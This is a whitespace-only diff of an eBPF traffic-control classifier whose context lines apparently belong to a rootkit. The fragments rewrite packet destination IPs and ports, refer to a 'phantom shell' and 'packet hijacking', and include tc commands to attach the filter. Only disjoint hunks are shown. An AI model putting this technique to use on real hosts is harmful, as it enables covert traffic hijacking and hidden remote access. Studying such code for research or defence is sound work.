@@ -25,7 +25,7 @@ int classifier_egress(struct __sk_buff *skb){
 	void *data = (void *)(__u64)skb->data;
 	void *data_end = (void *)(__u64)skb->data_end;
     //bpf_printk("TC egress classifier called\n");
-	
+
 	//We are interested on parsing TCP/IP packets so let's assume we have one
 	//Ethernet header
 	struct ethhdr *eth = data;
@@ -76,12 +76,12 @@ int classifier_egress(struct __sk_buff *skb){
 		bpf_printk("PAYLOAD CHECK, payload:%llx, payload_size:%llx, data_end:%llx\n", payload, payload_size, data_end);
         return TC_ACT_OK;
     }*/
-	
+
 	//Mark skb buffer readable and writable
 	bpf_skb_pull_data(skb, 0);
 
 	bpf_printk("PAYLOAD size: %u\n", payload_size);
-	
+
 	//We redirect whatever packet this is to the rootkit
 	//The TCP retransmissions will be in charge of resending it correctly later
 	__u64 key = 1;
@@ -135,7 +135,7 @@ int classifier_egress(struct __sk_buff *skb){
 		bpf_printk("Failed to overwrite destination ip: %d\n", ret);
 		return TC_ACT_OK;
 	}
-	
+
 	bpf_printk("offset port: %u\n", offset_dport);
 	ret = bpf_l4_csum_replace(skb, offset_tcp_checksum, old_dport, new_dport, sizeof(__u16));
 	if (ret < 0) {
@@ -161,7 +161,7 @@ int classifier_egress(struct __sk_buff *skb){
 	//After changing the packet bounds, all the boundaries must be check again
 	data = (void *)(__u64)skb->data;
 	data_end = (void *)(__u64)skb->data_end;
-	
+
 	eth = data;
 	if ((void *)eth + sizeof(struct ethhdr) > data_end){
         bpf_printk("ETH\n");
@@ -188,7 +188,7 @@ int classifier_egress(struct __sk_buff *skb){
 	if(data>data_end){
 		return TC_ACT_OK;
 	}
-	
+
 	__u32 offset = skb->len-payload_size-increment_len;
 	if(ps_data==(void*)0){
 		return TC_ACT_OK;
@@ -222,7 +222,7 @@ int classifier_egress(struct __sk_buff *skb){
 
 	data = (void *)(__u64)skb->data;
 	data_end = (void *)(__u64)skb->data_end;
-	
+
 	eth = data;
 	if ((void *)eth + sizeof(struct ethhdr) > data_end){
         bpf_printk("ETH\n");
@@ -258,7 +258,7 @@ int classifier_egress(struct __sk_buff *skb){
 	bpf_printk("Finished packet hijacking routine\n");
 
 	return TC_ACT_OK;
-	
+
 }
 
 SEC("classifier/ingress")
@@ -266,7 +266,7 @@ int classifier_ingress(struct __sk_buff *skb){
 	void *data = (void *)(__u64)skb->data;
 	void *data_end = (void *)(__u64)skb->data_end;
     bpf_printk("TC ingress classifier called\n");
-	
+
 	//We are interested on parsing TCP/IP packets so let's assume we have one
 	//Ethernet header
 	struct ethhdr *eth = data;
@@ -308,7 +308,7 @@ int classifier_ingress(struct __sk_buff *skb){
 	bpf_printk("Detected bounds: data:%llx, data_end:%llx", data, data_end);
 	bpf_printk("Detected headers: \n\teth:%llx\n\tip:%llx\n\ttcp:%llx\n", eth, ip, tcp);
 
-	
+
 	__u32 payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
     bpf_printk("ip_totlen: %u, tcp_doff*4: %u, ip_ihl: %u\n", ntohs(ip->tot_len), tcp->doff*4, ip->ihl*4);
 	char* payload = (void *)(tcp + tcp->doff*4);
@@ -320,7 +320,7 @@ int classifier_ingress(struct __sk_buff *skb){
 	bpf_skb_pull_data(skb, 0);
 
 	bpf_printk("PAYLOAD size: %u\n", payload_size);
-	
+
 	//We redirect whatever packet this is to the rootkit
 	//The TCP retransmissions will be in charge of resending it correctly later
 	/*__u64 key = 1;
@@ -356,7 +356,7 @@ int classifier_ingress(struct __sk_buff *skb){
 	if(err<0){
 		bpf_printk("Fail to update map\n");
 	}
-	
+
 	bpf_printk("Phantom shell active now: active is %i\n", ps_data->active);
 	__u32 new_ip = ps_data->d_ip;
 	__u16 new_port = ps_data->d_port;
@@ -376,7 +376,7 @@ int classifier_ingress(struct __sk_buff *skb){
 	}*/
 
 	return TC_ACT_OK;
-	
+
 }
 /**
  * COMMANDS
@@ -384,7 +384,7 @@ int classifier_ingress(struct __sk_buff *skb){
  * sudo tc filter add dev lo egress bpf direct-action obj tc.o sec classifier/egress
  * sudo tc filter show dev lo
  * sudo tc filter show dev lo egress
- * 
+ *
  * sudo tc qdisc del dev lo clsact
  */
 
